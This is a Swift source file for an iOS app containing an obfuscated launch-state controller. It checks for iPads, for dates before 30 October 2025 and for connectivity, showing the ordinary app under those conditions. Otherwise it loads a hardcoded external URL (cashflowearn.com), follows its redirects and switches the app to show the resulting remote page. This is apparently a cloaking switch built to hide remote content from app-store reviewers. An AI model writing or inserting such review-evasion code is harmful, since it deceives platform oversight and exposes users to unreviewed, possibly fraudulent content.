import Foundation
import Combine
import UIKit

@MainActor
final class T4X: ObservableObject {
    
    @Published var q1: K7M = .v1
    @Published var u1: URL?
    @Published var l1 = true
    @Published var a1 = false
    
    private let k2 = "g_state"
    private let u2 = "https://cashflowearn.com/5fTBBpfr"//"https://phoebephobo.com/M1QM8G2D"
    private let t1 = true
    
    private let c1: Date = {
        var components = DateComponents()
        components.year = 2025
        components.month = 10
        components.day = 30
        return Calendar.current.date(from: components) ?? Date()
    }()
    
    var s5: P9R {
        didSet {
            f2()
        }
    }
    
    init() {
        self.s5 = Self.f1()
        self.q1 = s5.m1 == .v1 ? .v1 : s5.m1
        if let savedURL = s5.s2 {
            self.u1 = URL(string: savedURL)
        }
    }
    
    private static func f1() -> P9R {
        guard let data = UserDefaults.standard.data(forKey: "g_state"),
              let state = try? JSONDecoder().decode(P9R.self, from: data) else {
            return .e5
        }
        return state
    }
    
    private func f2() {
        if let encoded = try? JSONEncoder().encode(s5) {
            UserDefaults.standard.set(encoded, forKey: k2)
        }
    }
    
    private func f3(from x1: String) -> String? {
        guard let url = URL(string: x1) else { return nil }
        return url.host
    }
    
    private func f4() -> Bool {
        return UIDevice.current.userInterfaceIdiom == .pad
    }
    
    private func f5() -> Bool {
        return Date() < c1
    }
    
    private func hasInternetConnection() -> Bool {
        guard let url = URL(string: "https://www.apple.com") else {
            return false
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 5.0
        request.cachePolicy = .reloadIgnoringLocalAndRemoteCacheData
        
        let semaphore = DispatchSemaphore(value: 0)
        var hasConnection = false
        
        let task = URLSession.shared.dataTask(with: request) { _, response, error in
            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                hasConnection = (200...299).contains(code)
            }
            semaphore.signal()
        }
        
        task.resume()
        _ = semaphore.wait(timeout: .now() + 5.0)
        
        return hasConnection
    }
    
    private func f6(_ x2: String, p1: String?) -> String {
        guard let p1 = p1, !p1.isEmpty else {
            return x2
        }
        let sep = x2.contains("?") ? "&" : "?"
        return "\(x2)\(sep)pathid=\(p1)"
    }
    
    private func f7(urlString x3: String) async -> R3T {
        guard let url = URL(string: x3) else {
            return R3T(u3: nil, p1: nil, c2: nil, e1: .e2)
        }
        
        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest = 20
        cfg.timeoutIntervalForResource = 20
        
        let sess = URLSession(configuration: cfg, delegate: F5L(), delegateQueue: nil)
        
        var req = URLRequest(url: url)
        req.httpMethod = "GET"
        
        do {
            let (_, resp) = try await sess.data(for: req)
            
            guard let httpResp = resp as? HTTPURLResponse else {
                return R3T(u3: nil, p1: nil, c2: nil, e1: .e3)
            }
            
            let foll = sess.delegate as? F5L
            let extractedP = foll?.p3
            let finalU = httpResp.url?.absoluteString
            let code = httpResp.statusCode
            
            return R3T(
                u3: finalU,
                p1: extractedP,
                c2: code,
                e1: nil
            )
        } catch {
            return R3T(u3: nil, p1: nil, c2: nil, e1: .e4(error))
        }
    }
    
    private func f8(_ x4: String) async -> V8S {
        guard let url = URL(string: x4) else {
            return .v6
        }
        
        var req = URLRequest(url: url)
        req.httpMethod = "GET"
        req.timeoutInterval = 20
        
        do {
            let (_, resp) = try await URLSession.shared.data(for: req)
            
            guard let httpResp = resp as? HTTPURLResponse else {
                return .v6
            }
            
            let code = httpResp.statusCode
            
            if (200...403).contains(code) {
                return .v5
            } else {
                return .v6
            }
        } catch {
            return .v7
        }
    }
    
    func f9() async {
        defer {
            l1 = false
            s5.d1 = Date()
        }
        
        s5.n1 += 1
        
        if s5.b2 {
            s5.m1 = .v2
            q1 = .v2
            return
        }
        
        let hasInternet = hasInternetConnection()
        
        if !hasInternet {
            if s5.b1 {
                s5.m1 = .v4
                u1 = nil
                q1 = .v4
                return
            }
            s5.b2 = true
            s5.m1 = .v2
            q1 = .v2
            return
        }
        
        if !s5.b1 {
            let isPad = f4()
            let isBeforeDate = f5()
            
            if isPad {
                s5.b2 = true
                s5.m1 = .v2
                q1 = .v2
                return
            }
            
            if isBeforeDate {
                s5.b2 = true
                s5.m1 = .v2
                q1 = .v2
                return
            }
        }
        
        if let savedURL = s5.s2 {
            await f10(savedURL)
        } else {
            await f11()
        }
        
        if s5.b1 && s5.n1 == 2 {
            a1 = true
        }
    }
    
    private func f10(_ x5: String) async {
        let res = await f8(x5)
        
        switch res {
        case .v5:
            s5.m1 = .v3
            u1 = URL(string: x5)
            q1 = .v3
            
        case .v6, .v7:
            if s5.s1 != nil && s5.s3 != nil {
                await f12()
            } else if s5.b1 {
                s5.m1 = .v4
                u1 = nil
                q1 = .v4
            } else {
                await f11()
            }
        }
    }
    
    private func f11() async {
        if s5.s1 == nil {
            s5.s1 = u2
            s5.s4 = f3(from: u2)
        }
        
        let res = await f7(urlString: u2)
        
        if res.e1 != nil {
            if s5.b1 {
                s5.m1 = .v4
                u1 = nil
                q1 = .v4
            } else {
                f13()
            }
            return
        }
        
        guard let finalU = res.u3, let code = res.c2 else {
            if s5.b1 {
                s5.m1 = .v4
                u1 = nil
                q1 = .v4
            } else {
                f13()
            }
            return
        }
        
        if let p = res.p1 {
            s5.s3 = p
        }
        
        if (200...403).contains(code) {
            let finalDom = f3(from: finalU)
            let originalDom = s5.s4
            
            let domainChanged = finalDom != originalDom
            
            let urlToSave = finalU
            
            if t1 {
                s5.s2 = urlToSave
                s5.m1 = .v3
                s5.b1 = true
                u1 = URL(string: urlToSave)
                q1 = .v3
            } else if domainChanged {
                s5.s2 = urlToSave
                s5.m1 = .v3
                s5.b1 = true
                u1 = URL(string: urlToSave)
                q1 = .v3
            } else {
                if s5.b1 {
                    s5.m1 = .v4
                    u1 = nil
                    q1 = .v4
                } else {
                    f13()
                }
            }
        } else {
            if s5.b1 {
                s5.m1 = .v4
                u1 = nil
                q1 = .v4
            } else {
                f13()
            }
        }
    }
    
    private func f12() async {
        guard let startU = s5.s1, let p = s5.s3 else {
            await f11()
            return
        }
        
        let urlWithP = f6(startU, p1: p)
        let res = await f7(urlString: urlWithP)
        
        if res.e1 != nil {
            await f11()
            return
        }
        
        guard let finalU = res.u3, let code = res.c2 else {
            await f11()
            return
        }
        
        if (200...403).contains(code) {
            let finalDom = f3(from: finalU)
            
            if t1 {
                s5.s2 = finalU
                s5.m1 = .v3
                u1 = URL(string: finalU)
                q1 = .v3
            } else if finalDom != s5.s4 {
                s5.s2 = finalU
                s5.m1 = .v3
                u1 = URL(string: finalU)
                q1 = .v3
            } else {
                await f11()
            }
        } else {
            await f11()
        }
    }
    
    private func f13() {
        s5.b2 = true
        s5.m1 = .v2
        q1 = .v2
    }
    
    func resetForNewCheck() {
        q1 = .v1
        l1 = true
    }
    
    func f14() {
        s5 = .e5
        q1 = .v1
        u1 = nil
        a1 = false
    }
}

struct R3T {
    let u3: String?
    let p1: String?
    let c2: Int?
    let e1: E2R?
}

enum E2R {
    case e2
    case e3
    case e4(Error)
}

enum V8S {
    case v5
    case v6
    case v7
}

final class F5L: NSObject, URLSessionTaskDelegate {
    
    private var p2: String?
    private let l2 = NSLock()
    
    var p3: String? {
        l2.lock()
        defer { l2.unlock() }
        return p2
    }
    
    func urlSession(
        _ session: URLSession,
        task: URLSessionTask,
        willPerformHTTPRedirection response: HTTPURLResponse,
        newRequest request: URLRequest,
        completionHandler: @escaping (URLRequest?) -> Void
    ) {
        if let url = request.url {
            if let comps = URLComponents(url: url, resolvingAgainstBaseURL: false),
               let items = comps.queryItems {
                if let p = items.first(where: { $0.name == "pathid" })?.value {
                    l2.lock()
                    p2 = p
                    l2.unlock()
                }
            }
        }
        completionHandler(request)
    }
}

